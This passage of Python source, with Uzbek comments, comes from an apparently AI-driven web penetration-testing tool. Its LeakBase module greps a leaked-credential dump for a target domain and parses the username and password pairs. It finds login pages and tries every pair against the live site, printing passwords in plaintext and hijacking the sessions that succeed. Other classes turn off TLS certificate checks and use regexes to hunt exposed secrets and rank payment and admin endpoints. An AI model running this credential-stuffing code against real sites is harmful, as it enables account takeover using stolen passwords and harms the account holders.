        if any(x in path for x in ["upload","file","image","media"]):      return "upload_endpoint"
        if any(x in path for x in ["user","profile","account"]):           return "user_endpoint"
        if any(x in path for x in ["pay","order","checkout","transfer"]):  return "payment_endpoint"
        return "generic_endpoint"


# ─────────────────────────────────────────────────────────────────────────────
# LEAKBASE SCANNER — /authbypass/Auth_Database.txt dan credential search
# ─────────────────────────────────────────────────────────────────────────────
class LeakBaseScanner:
    """
   Task 3: Pre-Pentest Target Validation Using LeakBase

   Before starting the penetration test, the system must check whether the target exists in a LeakBase file.
   File Format Examples
   https://www.example.com/:username:password  
   https://site.com/path/:user:pass  
   site.com:username:password  
    Logic Flow
    Search Target in LeakBase
    Use grep (or equivalent) to search for the target domain inside the LeakBase file.
    Extract Credentials
    Parse all matching entries.
    Extract:
    URL / Domain
    Username
    Password
    Attempt Authentication
    For each найден credential:
    Attempt login on the target system.
    If Login is Successful

    AI should respond:

"Credentials found in leak. Authenticated pentest initiated."

Store session (cookies / tokens).
Continue further testing in authenticated mode.
If No Valid Credentials Found

AI should respond:

"No valid credentials found in leak. Proceeding with standard pentest."

Usage
LEAKBASE_PATH = "/authbypass/Auth_Database.txt"
    """

    # Use a repo-local path by default (portable across OSes/containers).
    LEAKBASE_PATH = Path(__file__).parent / "authbypass" / "Auth_Database.txt"

    def __init__(self, client: "HTTPClient", ai: "AIEngine"):
        self.client = client
        self.ai     = ai

    def scan(self, target: str, login_url: str = "") -> dict:
        """
        Target uchun LeakBase-ni tekshiradi.

        Returns: {
            "found": bool,
            "credentials": [{"username": str, "password": str, "source_line": str}],
            "successful_logins": [{"username": str, "password": str}],
            "ai_explanation": str,
            "session_updated": bool,
        }
        """
        result = {
            "found": False,
            "credentials": [],
            "successful_logins": [],
            "ai_explanation": "",
            "session_updated": False,
        }

        console.print(f"\n[cyan]━━ LEAKBASE SCAN ━━[/cyan]")

        # 1. Fayl mavjudmi?
        if not self.LEAKBASE_PATH.exists():
            msg = f"LeakBase fayli topilmadi: {self.LEAKBASE_PATH}"
            console.print(f"  [dim yellow]  ⚠ {msg}[/dim yellow]")
            result["ai_explanation"] = msg
            return result

        file_size_mb = self.LEAKBASE_PATH.stat().st_size / (1024 * 1024)
        console.print(
            f"  [dim]  LeakBase: {self.LEAKBASE_PATH} "
            f"({file_size_mb:.1f} MB)[/dim]"
        )

        # 2. Target domain-ni ajratish
        parsed     = urllib.parse.urlparse(target)
        domain     = parsed.netloc or parsed.path
        domain     = domain.split(":")[0]   # port ni olib tashlash
        # www ni ham sinab ko'rish uchun
        bare       = domain.replace("www.","") if domain.startswith("www.") else domain
        www_domain = "www." + bare if not domain.startswith("www.") else domain

        search_terms = list({domain, bare, www_domain})
        console.print(f"  [dim]  Searching for: {search_terms}[/dim]")

        # 3. grep bilan qidirish — tez va samarali
        raw_lines = []
        has_grep = shutil.which("grep") is not None

        if has_grep:
            for term in search_terms:
                if not term:
                    continue
                r = _run_cmd(
                    f"grep -aF '{term}' '{self.LEAKBASE_PATH}' 2>/dev/null",
                    timeout=60
                )
                if r.get("success") and r.get("output"):
                    for line in r.get("output","").splitlines():
                        line = line.strip()
                        if line and line not in raw_lines:
                            raw_lines.append(line)
        else:
            terms = [t.lower() for t in search_terms if t]
            try:
                with self.LEAKBASE_PATH.open("r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        ll = line.lower()
                        if any(t in ll for t in terms):
                            s = line.strip()
                            if s and s not in raw_lines:
                                raw_lines.append(s)
            except Exception:
                raw_lines = []

        if not raw_lines:
            console.print(f"  [dim]  LeakBase: domain '{domain}' uchun hech narsa topilmadi[/dim]")
            ai_msg = self._ai_explain_not_found(domain)
            result["ai_explanation"] = ai_msg
            console.print(f"  [cyan]  🤖 AI: {ai_msg}[/cyan]")
            return result

        console.print(
            f"  [green]  ✓ LeakBase: {len(raw_lines)} ta credential topildi![/green]"
        )

        # 4. Credential-larni parse qilish
        creds = []
        for n, line in enumerate(raw_lines[:500], 1):   # max 500 ta sinab ko'ramiz
            parsed_cred = self._parse_line(line, domain)
            if parsed_cred:
                creds.append(parsed_cred)
                console.print(f"  [cyan]    [{n:>3}] {parsed_cred['username']}:{parsed_cred['password']}[/cyan]")

        if not creds:
            msg = f"LeakBase-da {len(raw_lines)} ta qator topildi lekin credential parse qilinmadi"
            console.print(f"  [yellow]  ⚠ {msg}[/yellow]")
            result["ai_explanation"] = msg
            return result

        result["found"]       = True
        result["credentials"] = creds

        # 5. Login URL aniqlashtirish
        if not login_url:
            login_url = self._detect_login_url(target)
        console.print(f"  [dim]  Login URL: {login_url}[/dim]")

        # 6. Har bir credential-ni sinash
        console.print(f"  [dim]  Testing {len(creds)} credentials...[/dim]")
        for cred in creds:
            username = cred["username"]
            password = cred["password"]

            console.print(f"  [dim]    ▶ {username}:{password}[/dim]", end="")

            success, session_info = self._try_login(login_url, username, password)

            if success:
                console.print(f"  [bold green] ✅ SUCCESS! {username}:{password}[/bold green]")
                result["successful_logins"].append({
                    "username":     username,
                    "password":     password,
                    "source_line":  cred["source_line"][:100],
                    "session_info": session_info,
                })
                # Session-ni update qilish
                if session_info.get("cookies"):
                    self.client.session.cookies.update(session_info["cookies"])
                    result["session_updated"] = True
                if session_info.get("jwt"):
                    self.client.session.jwt_token = session_info["jwt"]
                    result["session_updated"] = True
                self.client.session.logged_in = True
                self.client.session.username  = username
            else:
                console.print(f"  [dim red]  ✗ failed  {username}:{password}[/dim red]")

        # 7. AI tushuntirish
        ai_msg = self._ai_explain_result(
            domain=domain,
            total_found=len(creds),
            successful=result["successful_logins"],
        )
        result["ai_explanation"] = ai_msg
        console.print(f"\n  [bold cyan]  🤖 AI: {ai_msg}[/bold cyan]")

        return result

    def _parse_line(self, line: str, domain: str) -> Optional[dict]:
        """
        Qatordan username va password-ni ajratib oladi.

        Format-lar:
          https://site.com/:username:PASSWORD
          https://site.com/path/:user:pass
          site.com:username:password
          https://site.com/:user:pass:extrafield
          url TAB user TAB pass
        """
        if not line or len(line) < 5:
            return None

        # Tab-separated format
        if "\t" in line:
            parts = line.split("\t")
            if len(parts) >= 3:
                # url	user	pass yoki user	pass
                if any(p.startswith(("http","https")) for p in parts):
                    url_idx = next(
                        (i for i, p in enumerate(parts)
                         if p.startswith(("http","https"))), 0
                    )
                    remaining = [p for i,p in enumerate(parts) if i != url_idx]
                    if len(remaining) >= 2:
                        return {
                            "username":    remaining[0].strip(),
                            "password":    remaining[1].strip(),
                            "source_line": line,
                        }

        # Colon-separated: https://site.com/:user:pass
        # yoki site.com:user:pass
        # Strategy: URL-dan keyin : bilan ajratilgan
        # URL qismini skip qilamiz

        # HTTP URL bo'lsa
        if line.startswith(("http://","https://")):
            # URL-ni ajratamiz
            # Format: https://site.com/path/:user:pass
            # yoki:   https://site.com/:user:pass
            rest = line

            # URL tugashini topamiz (path / dan keyin : bor)
            # Masalan: https://www.site.com/:admin:pass123
            # path = /, credential = admin:pass123
            m = re.match(
                r'https?://[^/:]+(?:/[^:]*)?:([^:]+):(.+)$',
                rest
            )
            if m:
                username = m.group(1).strip()
                password = m.group(2).strip()
                # Extra fields bo'lsa (user:pass:email) — faqat birinchi ikkitasi
                if username and password and len(username) < 100 and len(password) < 100:
                    return {
                        "username":    username,
                        "password":    password,
                        "source_line": line,
                    }
        else:
            # domain:user:pass format
            parts = line.split(":")
            if len(parts) >= 3:
                # birinchi qism domain, qolganlar credential
                username = parts[1].strip()
                password = ":".join(parts[2:]).strip()
                if username and password:
                    return {
                        "username":    username,
                        "password":    password,
                        "source_line": line,
                    }
        return None

    def _detect_login_url(self, target: str) -> str:
        """Login URL-ni avtomatik topish."""
        base   = target.rstrip("/")
        probes = [
            "/login", "/signin", "/auth/login", "/user/login",
            "/account/login", "/api/login", "/api/auth",
            "/admin/login", "/admin", "/wp-login.php",
        ]
        for path in probes:
            url = base + path
            r   = self.client.get(url)
            if r.get("status") in (200, 302):
                body_l = r.get("body","").lower()
                if any(s in body_l for s in ["password","username","login","signin"]):
                    console.print(f"  [dim]  Login URL detected: {url}[/dim]")
                    return url
        return base + "/login"

    def _try_login(self, login_url: str, username: str, password: str) -> tuple:
        """
        Credential-ni sinab ko'radi.
        Returns: (success: bool, session_info: dict)
        """
        # Login page-ni GET qilib CSRF token olish
        r_get  = self.client.get(login_url)
        csrf   = self._extract_csrf(r_get.get("body",""))

        # AI-dan field nomlarini aniqlash
        fmap = self.ai.identify_login_fields(r_get.get("body",""), login_url)

        payload = {
            fmap.get("username_field","username"): username,
            fmap.get("password_field","password"):  password,
        }
        if csrf:
            payload[fmap.get("csrf_field","csrf_token")] = csrf

        r_post = self.client.post(login_url, data=payload)
        status = r_post.get("status", 0)
        body   = r_post.get("body","").lower()
        loc    = r_post.get("headers",{}).get("location","").lower()

        # Success detection
        success = False
        if status in (301,302):
            # Redirect away from login = success
            if not any(x in loc for x in ["/login","/signin","/error","?error"]):
                success = True
        elif status == 200:
            fail_sigs = ["invalid password","login failed","wrong password",
                         "invalid credentials","incorrect","authentication failed",
                         "invalid username","account not found"]
            ok_sigs   = ["dashboard","welcome","logout","profile","sign out",
                         username.lower()[:20] if len(username)>3 else "___"]
            if not any(s in body for s in fail_sigs):
                if any(s in body for s in ok_sigs):
                    success = True

        session_info = {}
        if success:
            session_info["cookies"] = dict(self.client.session.cookies)
            session_info["status"]  = status
            # JWT token bo'lsa
            for hdr_name in ["authorization","x-auth-token","x-access-token"]:
                val = r_post.get("headers",{}).get(hdr_name,"")
                if val and val.startswith("Bearer "):
                    session_info["jwt"] = val.replace("Bearer ","").strip()

        return success, session_info

    def _extract_csrf(self, body: str) -> str:
        # CSRF token extraction from HTML forms
        for pat in [
            r'name="(?:csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token)"[^>]+value="([^"]+)"',
            r"name='(?:csrf[_-]?token|_token|csrfmiddlewaretoken|authenticity_token)'[^>]+value='([^']+)'",
            r'content="([^"]+)"[^>]*name="csrf-token"',
            r'"csrf_?[Tt]oken"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pat, body, re.I)
            if m: return m.group(1)
        return ""

    def _ai_explain_not_found(self, domain: str) -> str:
        """AI tushuntiradi: leakdan hech narsa topilmadi."""
        prompt = f"""You are a penetration tester. The LeakBase database was searched for '{domain}'.
No credentials were found.
Explain in 1-2 sentences: why this means nothing was found, and confirm that normal black-box
penetration testing will continue.
Return as plain text (no JSON)."""
        if not HAS_OLLAMA:
            return (f"LeakBase-da '{domain}' uchun hech qanday ma'lumot topilmadi. "
                    f"Odatiy black-box pentest davom ettiriladi.")
        try:
            raw = self.ai._chat_text(
                [{"role":"user","content":prompt}],
                timeout_sec=AI_CALL_TIMEOUT_SEC,
            )
            return str(raw).strip()[:300]
        except Exception:
            return (f"LeakBase-da '{domain}' uchun hech qanday credential topilmadi. "
                    f"Odatiy pentest davom ettiriladi.")

    def _ai_explain_result(self, domain: str, total_found: int,
                            successful: list) -> str:
        """AI tushuntiradi: nima topildi va nima qilinadi keyingi."""
        if successful:
            creds_info = [
                f"{s['username']}:{s['password'][:6]}..."
                for s in successful[:3]
            ]
            prompt = f"""You are a penetration tester. LeakBase credential database was searched for '{domain}'.
{total_found} credentials found in database.
{len(successful)} credentials successfully authenticated: {creds_info}

Explain in 2-3 sentences:
1. That credentials were found in the LeakBase database
2. That login was successful with these leaked credentials
3. That the penetration test is now continuing as an AUTHENTICATED scan with admin/user access

Be direct and professional. Return as plain text (no JSON)."""
        else:
            prompt = f"""You are a penetration tester. LeakBase credential database was searched for '{domain}'.
{total_found} credentials found in database but ALL login attempts failed.

Explain in 1-2 sentences:
1. That credentials were found in LeakBase but they are no longer valid
2. That normal unauthenticated penetration testing will continue

Return as plain text (no JSON)."""

        if not HAS_OLLAMA:
            if successful:
                return (f"LeakBase-dan '{domain}' uchun {total_found} ta credential topildi va "
                        f"{len(successful)} tasi muvaffaqiyatli login qildi. "
                        f"Pentest endi authenticated rejimda davom etadi.")
            return (f"LeakBase-dan {total_found} ta credential topildi lekin "
                    f"hech biri hozir ishlamaydi. Oddiy pentest davom etadi.")
        try:
            raw = self.ai._chat_text(
                [{"role":"user","content":prompt}],
                timeout_sec=AI_CALL_TIMEOUT_SEC,
            )
            return str(raw).strip()[:400]
        except Exception:
            if successful:
                return (f"LeakBase-dan '{domain}' uchun {total_found} ta credential topildi. "
                        f"{len(successful)} ta login muvaffaqiyatli — authenticated pentest boshlandi.")
            return f"LeakBase-dan {total_found} ta credential topildi lekin hammasi xato."


# ─────────────────────────────────────────────────────────────────────────────
# HTTP CLIENT
# ─────────────────────────────────────────────────────────────────────────────
class HTTPClient:
    def __init__(self, session: SessionContext, timeout: int = DEFAULT_TIMEOUT):
        self.session = session
        self.timeout = timeout
        self._ctx    = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode    = ssl.CERT_NONE
        self._jar    = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=self._ctx),
            urllib.request.HTTPCookieProcessor(self._jar),
        )
        self._rate_delay: float = 0.0
        self._429_count:  int   = 0

    def _build_headers(self, extra: dict = None) -> dict:
        h = {
            "User-Agent":      DEFAULT_UA,
            "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if self.session.cookies:
            h["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.session.cookies.items())
        if self.session.jwt_token:
            h["Authorization"] = f"Bearer {self.session.jwt_token}"
        if self.session.csrf_token:
            h["X-CSRFToken"] = self.session.csrf_token
        if self.session.headers:
            h.update(self.session.headers)
        if extra:
            h.update(extra)
        return h

    def get(self, url: str, extra_headers: dict = None) -> dict:
        return self._request(url, "GET", headers=extra_headers)

    def post(self, url: str, data: Any = None,
             json_data: dict = None, extra_headers: dict = None) -> dict:
        body, ct = b"", "application/x-www-form-urlencoded"
        if json_data is not None:
            body = json.dumps(json_data).encode()
            ct   = "application/json"
        elif isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
        elif isinstance(data, (str, bytes)):
            body = data.encode() if isinstance(data, str) else data
        h = {"Content-Type": ct}
        if extra_headers:
            h.update(extra_headers)
        return self._request(url, "POST", body=body, headers=h)

    def _request(self, url: str, method: str,
                 body: bytes = None, headers: dict = None) -> dict:
        if self._rate_delay > 0:
            time.sleep(self._rate_delay)
        h   = self._build_headers(headers)
        req = urllib.request.Request(url, data=body, headers=h, method=method)
        t0  = time.time()
        try:
            with self._opener.open(req, timeout=self.timeout) as r:
                raw       = r.read(250_000)
                timing    = time.time() - t0
                resp_body = raw.decode("utf-8", errors="replace")
                resp_hdrs = dict(r.headers)
                for c in self._jar:
                    self.session.cookies[c.name] = c.value
                self._429_count = 0
                if self._rate_delay > 0:
                    # Successful response: quickly recover from previous throttling
                    self._rate_delay = max(0.0, self._rate_delay * 0.5)
                    if self._rate_delay < 0.5:
                        self._rate_delay = 0.0
                return {
                    "ok": True, "status": r.status, "url": r.url,
                    "headers": resp_hdrs, "body": resp_body,
                    "timing": round(timing, 3), "error": None,
                }
        except urllib.error.HTTPError as e:
            timing    = time.time() - t0
            resp_body = e.read(50_000).decode("utf-8", errors="replace") if e.fp else ""
            if e.code == 429:
                self._429_count += 1
                delay = min(2 ** self._429_count, 8.0)
                self._rate_delay = max(self._rate_delay, delay)
                console.print(f"  [dim yellow]  429 — backing off {delay:.0f}s[/dim yellow]")
                time.sleep(delay)
            return {
                "ok": False, "status": e.code, "url": url,
                "headers": dict(e.headers) if e.headers else {},
                "body": resp_body, "timing": round(timing, 3), "error": str(e),
            }
        except Exception as e:
            return {
                "ok": False, "status": 0, "url": url,
                "headers": {}, "body": "", "timing": 0.0, "error": str(e),
            }


# ─────────────────────────────────────────────────────────────────────────────
# RISK SCORER
# ─────────────────────────────────────────────────────────────────────────────
class RiskScorer:
    _HIGH_URL = [
        "admin","administrator","config","settings","setup","backup",
        "debug","test","dev","staging","env",".env","internal","private",
        "secret","api","v1","v2","v3","graphql","upload","import","export",
        "reset","forgot","password","token","template","shell","exec","cmd",
        "swagger","openapi","redoc","actuator","metrics","health","phpmyadmin",
        "adminer","cpanel","webmin","console","install","wizard","migrate",
    ]
    _SENSITIVE_BODY = [
        "db_host","db_pass","database_url","redis_url","api_key","api_secret",
        "secret_key","private_key","smtp","mail_pass","aws_access","aws_secret",
        "jwt_secret","jwt_key","app_secret","password","passwd","credentials",
        "connection_string","mongo_uri","postgres_url","mysql_pwd",
    ]

    # High-value endpoint keywords with their scores
    _CRITICAL_PATHS = {
        # Payment/financial — highest priority (business logic bugs)
        "transfer": 50, "payment": 50, "pay": 45, "checkout": 45,
        "order": 40, "withdraw": 50, "deposit": 45, "balance": 40,
        "transaction": 45, "invoice": 35, "refund": 40, "coupon": 35,
        # Auth endpoints
        "login": 40, "signin": 40, "auth": 35, "register": 35,
        "signup": 35, "reset": 40, "forgot": 40, "password": 35,
        "token": 30, "oauth": 35, "saml": 35,
        # Admin/sensitive
        "admin": 45, "administrator": 45, "dashboard": 35,
        "panel": 35, "manage": 35, "management": 35,
        "internal": 40, "private": 40, "secret": 45,
        "debug": 45, "test": 20, "dev": 25, "staging": 30,
        # API
        "api": 30, "v1": 25, "v2": 25, "v3": 25, "graphql": 35,
        # Upload/file
        "upload": 35, "file": 30, "import": 35, "export": 30,
        "attach": 30, "media": 20, "image": 20,
        # Config/sensitive files
        "config": 35, "settings": 30, "env": 40, "backup": 40,
        "actuator": 40, "metrics": 30, "health": 20,
        # User data
        "user": 25, "account": 25, "profile": 25,
    }

    _SECRET_KEY_LABELS = {
        "db_host": "database host",
        "db_pass": "database password",
        "database_url": "database URL",
        "redis_url": "redis URL",
        "api_key": "API key",
        "api_secret": "API secret",
        "secret_key": "secret key",
        "private_key": "private key",
        "smtp": "SMTP credential",
        "smtp_password": "SMTP password",
        "mail_pass": "mail password",
        "aws_access": "AWS access key",
        "aws_access_key_id": "AWS access key",
        "aws_secret": "AWS secret key",
        "aws_secret_access_key": "AWS secret key",
        "jwt_secret": "JWT secret",
        "jwt_key": "JWT key",
        "app_secret": "application secret",
        "connection_string": "connection string",
        "mongo_uri": "MongoDB URI",
        "postgres_url": "PostgreSQL URL",
        "mysql_pwd": "MySQL password",
        "token": "access token",
        "bearer": "bearer token",
    }
    _CRITICAL_SECRET_KEYS = {
        "db_pass", "api_secret", "private_key", "aws_secret",
        "aws_secret_access_key", "jwt_secret", "app_secret",
    }
    _NON_SECRET_VALUES = {
        "", "null", "none", "undefined", "password", "passwd", "credentials",
        "secret", "token", "api_key", "changeme", "change_me", "example",
        "sample", "demo", "test", "default", "placeholder", "your_token_here",
        "xxx", "***", "[redacted]",
    }
    _SENSITIVE_PATH_MARKERS = (
        ".env", "config.", "backup", "manifest", "routes-manifest",
        "build-manifest", "middleware-manifest", "runtime-config", "secrets",
        "credentials", "database.yml", "appsettings", "web.config",
    )

    @classmethod
    def score_url(cls, url: str) -> int:
        path  = urllib.parse.urlparse(url).path.lower()
        if ResponseClassifier.is_static_asset_url(url) and not cls.looks_sensitive_path(path):
            return 0

        # Score by critical path keywords (each keyword has its own weight)
        score = 0
        for kw, weight in cls._CRITICAL_PATHS.items():
            if kw in path:
                score += weight

        # Sensitive file extensions
        if any(path.endswith(e) for e in [
            ".bak",".sql",".zip",".tar",".gz",".log",".env",
            ".cfg",".conf",".ini",".xml",".json",".yml",".yaml"
        ]):
            score += 25

        # ID parameters — IDOR candidate
        if re.search(r'/\d+(?:/|$)', path):
            score += 10

        # POST/PUT endpoints worth more (state-changing)
        # Note: method not available here, handled in pipeline

        return min(score, 100)

    @classmethod
    def looks_sensitive_path(cls, path: str) -> bool:
        path_l = str(path or "").lower()
        return any(marker in path_l for marker in cls._SENSITIVE_PATH_MARKERS)

    @staticmethod
    def _body_excerpt(body: str, limit: int = 120_000) -> str:
        return str(body or "")[:limit]

    @staticmethod
    def _shannon_entropy(value: str) -> float:
        if not value:
            return 0.0
        counts = collections.Counter(value)
        total = len(value)
        entropy = 0.0
        for count in counts.values():
            p = count / total
            entropy -= p * math.log2(max(p, 1e-9))
        return entropy

    @classmethod
    def _value_looks_secret_like(cls, value: str, key_hint: str = "") -> bool:
        v = str(value or "").strip().strip("'\"")
        if not v:
            return False
        lower_v = v.lower()
        if lower_v in cls._NON_SECRET_VALUES:
            return False
        if v.startswith(("http://", "https://")) and key_hint not in {
            "database_url", "redis_url", "connection_string", "mongo_uri", "postgres_url",
        }:
            return False
        if re.fullmatch(r"[a-z_][a-z0-9_]{0,20}", lower_v):
            return False
        if len(v) >= 20 and re.search(r"[A-Z]", v) and re.search(r"[a-z]", v) and re.search(r"\d", v):
            return True
        if len(v) >= 24 and cls._shannon_entropy(v) >= 3.2:
            return True
        if key_hint in {"database_url", "redis_url", "connection_string", "mongo_uri", "postgres_url"}:
            return re.match(r"(?i)^[a-z][a-z0-9+.-]*://", v) is not None
        return False

    @staticmethod
    def _candidate_snippet(body: str, start: int, end: int, radius: int = 80) -> str:
        lo = max(0, start - radius)
        hi = min(len(body), end + radius)
        snippet = body[lo:hi].replace("\n", " ").replace("\r", " ")
        return re.sub(r"\s+", " ", snippet)[:220]

    @classmethod
    def _append_candidate(cls, findings: list, seen: Set[str], key: str, label: str,
                          value: str, risk: str, strong: bool, snippet: str):
        preview = str(value or "")[:80]
        fingerprint = hashlib.md5(f"{key}|{preview}".encode("utf-8", errors="ignore")).hexdigest()
        if fingerprint in seen:
            return
        seen.add(fingerprint)
        findings.append({
            "key": key,
            "label": label,
            "value": preview,
            "risk": risk,
            "strong": bool(strong),
            "snippet": snippet[:220],
        })

    @classmethod
    def has_strong_sensitive_candidate(cls, candidates: List[dict]) -> bool:
        return any(bool(item.get("strong")) for item in candidates or [])

    @classmethod
    def score_body(cls, body: str, url: str = "", headers: Optional[dict] = None) -> List[dict]:
        body = cls._body_excerpt(body)
        if not body:
            return []

        findings: List[dict] = []
        seen: Set[str] = set()

        structured_patterns = [
            (
                r"-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]{40,}?-----END [A-Z ]*PRIVATE KEY-----",
                "private_key", "PEM private key", "Critical", True,
            ),
            (
                r"\bAKIA[0-9A-Z]{16}\b",
                "aws_access", "AWS access key", "Critical", True,
            ),
            (
                r"\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b",
                "jwt_token", "JWT token", "High", True,
            ),
            (
                r"(?i)\b(?:postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis|amqp|mssql)://[^\s\"'<>]{12,}",
                "connection_string", "connection string", "Critical", True,
            ),
            (
                r"(?i)\bBearer\s+([A-Za-z0-9._-]{20,})\b",
                "bearer", "bearer token", "High", True,
            ),
        ]
        for pattern, key, label, risk, strong in structured_patterns:
            for match in re.finditer(pattern, body):
                value = match.group(1) if match.lastindex else match.group(0)
                cls._append_candidate(
                    findings,
                    seen,
                    key=key,
                    label=label,
                    value=value,
                    risk=risk,
                    strong=strong,
                    snippet=cls._candidate_snippet(body, match.start(), match.end()),
                )

        assignment_re = re.compile(
            r'(?is)["\']?('
            + "|".join(re.escape(k) for k in sorted(cls._SECRET_KEY_LABELS, key=len, reverse=True))
            + r')["\']?\s*[:=]\s*["\']?([^\s"\'<>{}]{8,240})'
        )
        for match in assignment_re.finditer(body):
            key = str(match.group(1) or "").lower()
            raw_value = str(match.group(2) or "").strip().strip(",;")
            if not cls._value_looks_secret_like(raw_value, key):
                continue
            strong = key in cls._CRITICAL_SECRET_KEYS or (
                len(raw_value) >= 24 and cls._shannon_entropy(raw_value) >= 3.1
            )
            risk = "Critical" if strong else "High"
            cls._append_candidate(
                findings,
                seen,
                key=key,
                label=cls._SECRET_KEY_LABELS.get(key, key.replace("_", " ")),
                value=raw_value,
                risk=risk,
                strong=strong,
                snippet=cls._candidate_snippet(body, match.start(), match.end()),
            )

        return findings[:12]

    @classmethod
    def detect_tech(cls, resp: dict) -> dict:
        tech    = {"lang":"unknown","server":"unknown","framework":"unknown","cms":"unknown"}
        headers = resp.get("headers", {})
        body    = resp.get("body", "")[:3000]
        url     = resp.get("url", "")
        profile = ResponseClassifier.classify(url, headers, body, resp.get("status", 0))

        server     = headers.get("server", headers.get("Server", ""))
        powered_by = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
        body_lower = body.lower()

        tech["server"] = server[:40] if server else "unknown"

        path_lower = urllib.parse.urlparse(url).path.lower()
        if profile.get("verdict") == "static_asset":
            if any(marker in path_lower for marker in ["/_next/", "/webpack", "/chunks/"]) or any(
                marker in body_lower for marker in ["__next", "__webpack", "webpack", "next/router"]
            ):
                tech["lang"] = "nodejs"
                tech["framework"] = "nextjs"

        if "PHP" in powered_by:          tech["lang"] = "php"
        elif "ASP.NET" in powered_by:    tech["lang"] = "aspnet"
        elif "Express" in powered_by or "Node" in powered_by:
                                          tech["lang"] = "nodejs"

        if tech["lang"] == "unknown":
            for sig, lang, fw, cms in [
                (".php", "php", "", ""),
                ("<?php", "php", "", ""),
                ("wp-content", "php", "wordpress", "wordpress"),
                ("joomla", "php", "joomla", "joomla"),
                ("drupal", "php", "drupal", "drupal"),
                ("csrfmiddlewaretoken", "python", "django", ""),
                ("authenticity_token", "ruby", "rails", ""),
                ("laravel", "php", "laravel", ""),
                ("spring", "java", "spring", ""),
                ("actuator", "java", "spring", ""),
                (".aspx", "aspnet", "", ""),
                ("__viewstate", "aspnet", "aspnet_webforms", ""),
            ]:
                if sig in body_lower:
                    tech["lang"] = lang
                    if fw:  tech["framework"] = fw
                    if cms: tech["cms"] = cms
                    break

        if "nginx"    in server.lower(): tech["server"] = "nginx"
        elif "apache"  in server.lower(): tech["server"] = "apache"
        elif "iis"     in server.lower():
            tech["server"] = "iis"
            if tech["lang"] == "unknown": tech["lang"] = "aspnet"
        elif "tomcat"  in server.lower():
            tech["server"] = "tomcat"
            if tech["lang"] == "unknown": tech["lang"] = "java"
        elif "werkzeug" in server.lower():
            tech["server"] = "werkzeug"
            if tech["lang"] == "unknown":
                tech["lang"]      = "python"
                tech["framework"] = "flask"
        elif "gunicorn" in server.lower():
            tech["server"] = "gunicorn"
            if tech["lang"] == "unknown": tech["lang"] = "python"
        elif "uvicorn"  in server.lower():
            tech["server"] = "uvicorn"
            if tech["lang"] == "unknown":
                tech["lang"]      = "python"
                tech["framework"] = "fastapi"

        # Werkzeug/Gunicorn Server header da bo'lmasa powered_by da tekshir
        if tech["lang"] == "unknown":
            pl = powered_by.lower()
            if "werkzeug" in pl:
                tech["lang"] = "python"; tech["framework"] = "flask"
            elif "flask"   in pl:
                tech["lang"] = "python"; tech["framework"] = "flask"
            elif "fastapi" in pl or "starlette" in pl:
                tech["lang"] = "python"; tech["framework"] = "fastapi"
            elif "django"  in pl:
                tech["lang"] = "python"; tech["framework"] = "django"

        # Body dan ham tekshir
        if tech["lang"] == "unknown" and profile.get("verdict") != "static_asset":
            if "werkzeug" in body_lower:
                tech["lang"] = "python"; tech["framework"] = "flask"
            elif "fastapi" in body_lower or "starlette" in body_lower:
                tech["lang"] = "python"; tech["framework"] = "fastapi"
            elif "gin-gonic" in body_lower or "fiber" in body_lower:
                tech["lang"] = "golang"
            elif "rack" in body_lower and "__next" not in body_lower and "_next" not in body_lower:
                tech["lang"] = "ruby"; tech["framework"] = "rack"

        return tech


class ResponseClassifier:
    _lock = threading.Lock()
    _cache: dict = {}
    _STATIC_EXTENSIONS = {
        ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".webp",
        ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".avif",
        ".mp3", ".wav", ".ogg", ".mp4", ".webm",
    }
    _STATIC_PATH_MARKERS = (
        "/_next/static/", "/_next/image", "/static/", "/assets/", "/favicon",
        "/images/", "/image/", "/img/", "/fonts/", "/css/", "/js/", "/dist/", "/build/",
    )

    @classmethod
    def normalize_content_type(cls, headers: Optional[dict]) -> str:
        headers = headers or {}
        ct = headers.get("content-type", headers.get("Content-Type", "")) or ""
        return str(ct).split(";", 1)[0].strip().lower()

    @classmethod
    def is_static_asset_url(cls, url: str) -> bool:
        path = urllib.parse.urlparse(str(url or "")).path.lower()
        if not path:
            return False
        if any(marker in path for marker in cls._STATIC_PATH_MARKERS):
            return True
        return any(path.endswith(ext) for ext in cls._STATIC_EXTENSIONS)

    @classmethod
    def is_sensitive_file_target(cls, url: str) -> bool:
        path = urllib.parse.urlparse(str(url or "")).path.lower()
        return RiskScorer.looks_sensitive_path(path)

    @staticmethod
    def _looks_like_html(body_l: str, ct: str) -> bool:
        return "text/html" in ct or "<html" in body_l or "<body" in body_l or "<head" in body_l

    @staticmethod
    def _looks_like_json(body: str, ct: str) -> bool:
        trimmed = body.lstrip()
        return "json" in ct or trimmed.startswith("{") or trimmed.startswith("[")

    @staticmethod
    def _looks_like_javascript(body_l: str, ct: str) -> bool:
        js_markers = [
            "javascript", "ecmascript", "__webpack", "webpackchunk", "sourceMappingURL",
            "Object.defineProperty(exports", "function(", "=>{", "export default", "use strict",
        ]
        if "javascript" in ct or "ecmascript" in ct:
            return True
        return sum(1 for marker in js_markers if marker.lower() in body_l) >= 2

    @staticmethod
    def _looks_like_css(body_l: str, ct: str) -> bool:
        if "text/css" in ct:
            return True
        css_markers = ["@media", "@font-face", "body{", "body {", ":root", "color:", "margin:"]
        return sum(1 for marker in css_markers if marker.lower() in body_l) >= 2

    @classmethod
    def classify(cls, url: str, headers: Optional[dict] = None, body: str = "",
                 status: int = 0) -> dict:
        body = str(body or "")
        ct = cls.normalize_content_type(headers)
        body_hash = hashlib.md5(body.encode("utf-8", errors="ignore")).hexdigest()
        cache_key = hashlib.md5(
